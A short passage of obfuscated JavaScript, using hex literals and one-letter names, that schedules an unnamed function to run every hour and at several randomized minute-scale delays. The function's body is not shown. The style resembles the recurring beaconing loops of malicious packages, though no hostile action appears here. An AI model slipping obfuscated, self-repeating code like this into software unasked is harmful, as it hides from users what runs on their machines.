    setTimeout(i, 0xea60 * m * getRandomInt(0x1, 0x3));
  setInterval(() => {
    i();
    for (let n = 0x0; n < 0x4; n++)
      setTimeout(i, 0xea60 * n * getRandomInt(0x1, 0x3));
  }, 0x36ee80);
})());